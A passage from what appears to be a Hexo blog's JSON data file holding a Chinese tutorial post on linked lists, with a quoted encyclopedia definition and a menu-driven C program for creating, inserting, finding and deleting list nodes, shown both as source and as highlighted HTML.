while(true)\n    {\n    \tsystem(\"CLS\");\n    \tmenu();\n    \tscanf(\"%d\",&choice);\n    \tswitch(choice)\n    \t{\n    \t\tcase 1:\n    \t\t{\n    \t\t\tprintf(\"请输入单链表的数据：\");\n\t\t\t    list = LinkedListCreatH_pre();\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 2:\n    \t\t{\n    \t\t\tprintf(\"请输入单链表的数据：\");\n\t\t\t    list = LinkedListCreatH_back();\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 3:\n    \t\t{\n    \t\t\tint i;\n\t\t\t    ElemType x;\n\t\t\t    printf(\"请输入插入数据的位置：\");\n\t\t\t    scanf(\"%d\",&i);\n\t\t\t    printf(\"请输入插入数据的值：\");\n\t\t\t    scanf(\"%d\",&x);\n\t\t\t    LinkedListInsert(list,i,x);\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 4:\n    \t\t{\n    \t\t\tElemType x;\n    \t\t\tprintf(\"请输入要查找的元素的值：\");\n\t\t\t    scanf(\"%d\",&x);\n\t\t\t    LinkedListFind(list,x);\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 5:\n    \t\t{\n    \t\t\tElemType x;\n    \t\t\tprintf(\"请输入要删除的元素的值：\");\n\t\t\t    scanf(\"%d\",&x);\n\t\t\t    LinkedListDelete(list,x);\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 0:return 0;\n    \t}\n    \tsystem(\"PAUSE\");\n    }\n    return 0;\n}\n```","source":"_posts/链表.md","raw":"---\ntitle: 链表\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 链表\nabbrlink: 2362a8ea\nupdated:\n---\n# 链表\n{% blockquote 百度百科 https://baike.baidu.com/item/%E9%93%BE%E8%A1%A8/9794473?fr=aladdin 链表 %}\n链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域。 相比于线性表顺序结构，操作复杂。由于不必须按顺序存储，链表在插入的时候可以达到O(1)的复杂度，比另一种线性表顺序表快得多，但是查找一个节点或者访问特定编号的节点则需要O(n)的时间，而线性表和顺序表相应的时间复杂度分别是O(logn)和O(1)。\n\n使用链表结构可以克服数组链表需要预先知道数据大小的缺点，链表结构可以充分利用计算机内存空间，实现灵活的内存动态管理。但是链表失去了数组随机读取的优点，同时链表由于增加了结点的指针域，空间开销比较大。链表最明显的好处就是，常规数组排列关联项目的方式可能不同于这些数据项目在记忆体或磁盘上顺序，数据的存取往往要在不同的排列顺序中转换。链表允许插入和移除表上任意位置上的节点，但是不允许随机存取。链表有很多种不同的类型：单向链表，双向链表以及循环链表。链表可以在多种编程语言中实现。像Lisp和Scheme这样的语言的内建数据类型中就包含了链表的存取和操作。程序语言或面向对象语言，如C,C++和Java依靠易变工具来生成链表。\n{% endblockquote %}\n<!--more-->\n# 代码\n```cpp\n#include <stdio.h>\n#include <stdlib.h>\ntypedef int ElemType;\ntypedef struct Node {\n    ElemType data;\n    struct Node *next;\n}Node,*LinkedList;\nLinkedList LinkedListInit() {\n    Node *L;\n    L = (Node *)malloc(sizeof(Node));\n    if(L == NULL) {\n        printf(\"申请内存空间失败\\n\");\n    }\n    L->next = NULL;\n \treturn L;\n}\nLinkedList LinkedListCreatH_pre() {\n    Node *L,*t;\n    t = L = (Node *)malloc(sizeof(Node));\n    ElemType x;\n    while(scanf(\"%d\",&x) != EOF) {\n        Node *p;\n        p = (Node *)malloc(sizeof(Node));\n        p->data = x;\n        t->next = p;\n        p->next=NULL;\n        t = t->next;\n    }\n    return L;\n}\nLinkedList LinkedListCreatH_back() {\n    Node *L;\n    L = (Node *)malloc(sizeof(Node));\n    L->next = NULL;\n    ElemType x;\n    while(scanf(\"%d\",&x) != EOF) {\n        Node *p;\n        p = (Node *)malloc(sizeof(Node));\n        p->data = x;\n        p->next = L->next;\n        L->next = p;\n    }\n    return L;\n}\nLinkedList LinkedListInsert(LinkedList L,int i,ElemType x) {\n    Node *pre=L;\n    int tempi = 0;\n    for (tempi = 1; tempi < i; tempi++) {\n    \tpre = pre->next;\n\t}\n    Node *p;\n    p = (Node *)malloc(sizeof(Node));\n    p->data = x;\n    p->next = pre->next;\n    pre->next = p;\n    return L;\n}\nLinkedList LinkedListFind(LinkedList L,ElemType x)\n{\n    int i=1;\n    Node *p=L->next;\n    while(p->data != x) {\n        if(p->next==NULL)\n        {\n            printf(\"没有此数！\\n\");\n            return L;\n        }\n        p = p->next;\n        i++;\n    }\n    printf(\"%d位于第%d个位置！\\n\",x,i);\n    return L;\n}\nLinkedList LinkedListDelete(LinkedList L,ElemType x)\n{\n    Node *p,*pre=L;\n    p = L->next;\n    while(p->data != x) {\n        if(p->next==NULL)\n        {\n            printf(\"没有此数！\\n\");\n            return L;\n        }\n        pre = p;\n        p = p->next;\n    }\n    pre->next = p->next;\n    free(p);\n    return L;\n}\nvoid menu()\n{\n\tprintf(\"1.输入(前插)\\n\");\n\tprintf(\"2.输入(后插)\\n\");\n\tprintf(\"3.插入数据\\n\");\n\tprintf(\"4.查找数据\\n\");\n\tprintf(\"5.删除数据\\n\");\n\tprintf(\"0.退出程序\\n\");\n}\nint main()\n{\n    LinkedList list,start;\n    int choice;\n    while(true)\n    {\n    \tsystem(\"CLS\");\n    \tmenu();\n    \tscanf(\"%d\",&choice);\n    \tswitch(choice)\n    \t{\n    \t\tcase 1:\n    \t\t{\n    \t\t\tprintf(\"请输入单链表的数据：\");\n\t\t\t    list = LinkedListCreatH_pre();\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 2:\n    \t\t{\n    \t\t\tprintf(\"请输入单链表的数据：\");\n\t\t\t    list = LinkedListCreatH_back();\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 3:\n    \t\t{\n    \t\t\tint i;\n\t\t\t    ElemType x;\n\t\t\t    printf(\"请输入插入数据的位置：\");\n\t\t\t    scanf(\"%d\",&i);\n\t\t\t    printf(\"请输入插入数据的值：\");\n\t\t\t    scanf(\"%d\",&x);\n\t\t\t    LinkedListInsert(list,i,x);\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 4:\n    \t\t{\n    \t\t\tElemType x;\n    \t\t\tprintf(\"请输入要查找的元素的值：\");\n\t\t\t    scanf(\"%d\",&x);\n\t\t\t    LinkedListFind(list,x);\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 5:\n    \t\t{\n    \t\t\tElemType x;\n    \t\t\tprintf(\"请输入要删除的元素的值：\");\n\t\t\t    scanf(\"%d\",&x);\n\t\t\t    LinkedListDelete(list,x);\n\t\t\t    for(start = list->next; start != NULL; start = start->next) {\n\t\t\t    \tprintf(\"%d \",start->data);\n\t\t\t\t}\n\t\t\t    printf(\"\\n\");\n\t\t\t    break;\n    \t\t}\n    \t\tcase 0:return 0;\n    \t}\n    \tsystem(\"PAUSE\");\n    }\n    return 0;\n}\n```","slug":"链表","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkee004aqse52zwecz9r","content":"<h1 id=\"链表\"><a href=\"#链表\" class=\"headerlink\" title=\"链表\"></a>链表</h1><blockquote><p>链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域。 相比于线性表顺序结构，操作复杂。由于不必须按顺序存储，链表在插入的时候可以达到O(1)的复杂度，比另一种线性表顺序表快得多，但是查找一个节点或者访问特定编号的节点则需要O(n)的时间，而线性表和顺序表相应的时间复杂度分别是O(logn)和O(1)。</p>\n<p>使用链表结构可以克服数组链表需要预先知道数据大小的缺点，链表结构可以充分利用计算机内存空间，实现灵活的内存动态管理。但是链表失去了数组随机读取的优点，同时链表由于增加了结点的指针域，空间开销比较大。链表最明显的好处就是，常规数组排列关联项目的方式可能不同于这些数据项目在记忆体或磁盘上顺序，数据的存取往往要在不同的排列顺序中转换。链表允许插入和移除表上任意位置上的节点，但是不允许随机存取。链表有很多种不同的类型：单向链表，双向链表以及循环链表。链表可以在多种编程语言中实现。像Lisp和Scheme这样的语言的内建数据类型中就包含了链表的存取和操作。程序语言或面向对象语言，如C,C++和Java依靠易变工具来生成链表。</p>\n<footer><strong>百度百科</strong><cite><a href=\"https://baike.baidu.com/item/%E9%93%BE%E8%A1%A8/9794473?fr=aladdin\">链表</a></cite></footer></blockquote>\n<a id=\"more\"></a>\n<h1 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> ElemType;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> &#123;</span></span><br><span class=\"line\">    ElemType data;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Node</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\">&#125;Node,*LinkedList;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListInit</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Node *L;</span><br><span class=\"line\">    L = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(L == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;申请内存空间失败\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    L-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"> \t<span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListCreatH_pre</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Node *L,*t;</span><br><span class=\"line\">    t = L = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">    ElemType x;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x) != EOF) &#123;</span><br><span class=\"line\">        Node *p;</span><br><span class=\"line\">        p = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">        p-&gt;data = x;</span><br><span class=\"line\">        t-&gt;next = p;</span><br><span class=\"line\">        p-&gt;next=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        t = t-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListCreatH_back</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    Node *L;</span><br><span class=\"line\">    L = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">    L-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    ElemType x;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x) != EOF) &#123;</span><br><span class=\"line\">        Node *p;</span><br><span class=\"line\">        p = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">        p-&gt;data = x;</span><br><span class=\"line\">        p-&gt;next = L-&gt;next;</span><br><span class=\"line\">        L-&gt;next = p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListInsert</span><span class=\"params\">(LinkedList L,<span class=\"keyword\">int</span> i,ElemType x)</span> </span>&#123;</span><br><span class=\"line\">    Node *pre=L;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> tempi = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (tempi = <span class=\"number\">1</span>; tempi &lt; i; tempi++) &#123;</span><br><span class=\"line\">    \tpre = pre-&gt;next;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    Node *p;</span><br><span class=\"line\">    p = (Node *)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(Node));</span><br><span class=\"line\">    p-&gt;data = x;</span><br><span class=\"line\">    p-&gt;next = pre-&gt;next;</span><br><span class=\"line\">    pre-&gt;next = p;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListFind</span><span class=\"params\">(LinkedList L,ElemType x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    Node *p=L-&gt;next;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(p-&gt;data != x) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p-&gt;next==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;没有此数！\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p = p-&gt;next;</span><br><span class=\"line\">        i++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d位于第%d个位置！\\n&quot;</span>,x,i);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">LinkedList <span class=\"title\">LinkedListDelete</span><span class=\"params\">(LinkedList L,ElemType x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    Node *p,*pre=L;</span><br><span class=\"line\">    p = L-&gt;next;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(p-&gt;data != x) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(p-&gt;next==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;没有此数！\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pre = p;</span><br><span class=\"line\">        p = p-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    pre-&gt;next = p-&gt;next;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> L;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">menu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1.输入(前插)\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2.输入(后插)\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3.插入数据\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4.查找数据\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5.删除数据\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;0.退出程序\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    LinkedList <span class=\"built_in\">list</span>,start;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> choice;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    \tsystem(<span class=\"string\">&quot;CLS&quot;</span>);</span><br><span class=\"line\">    \tmenu();</span><br><span class=\"line\">    \t<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;choice);</span><br><span class=\"line\">    \t<span class=\"keyword\">switch</span>(choice)</span><br><span class=\"line\">    \t&#123;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入单链表的数据：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">list</span> = LinkedListCreatH_pre();</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入单链表的数据：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">list</span> = LinkedListCreatH_back();</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t\t\t    ElemType x;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入插入数据的位置：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;i);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入插入数据的值：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x);</span><br><span class=\"line\">\t\t\t    LinkedListInsert(<span class=\"built_in\">list</span>,i,x);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\tElemType x;</span><br><span class=\"line\">    \t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入要查找的元素的值：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x);</span><br><span class=\"line\">\t\t\t    LinkedListFind(<span class=\"built_in\">list</span>,x);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">    \t\t&#123;</span><br><span class=\"line\">    \t\t\tElemType x;</span><br><span class=\"line\">    \t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入要删除的元素的值：&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;x);</span><br><span class=\"line\">\t\t\t    LinkedListDelete(<span class=\"built_in\">list</span>,x);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">for</span>(start = <span class=\"built_in\">list</span>-&gt;next; start != <span class=\"literal\">NULL</span>; start = start-&gt;next) &#123;</span><br><span class=\"line\">\t\t\t    \t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\t\t\t    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    \t\t&#125;</span><br><span class=\"line\">    \t\t<span class=\"keyword\">case</span> <span class=\"number\">0</span>:<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    \t&#125;</span><br><span class=\"line\">    \tsystem(<span 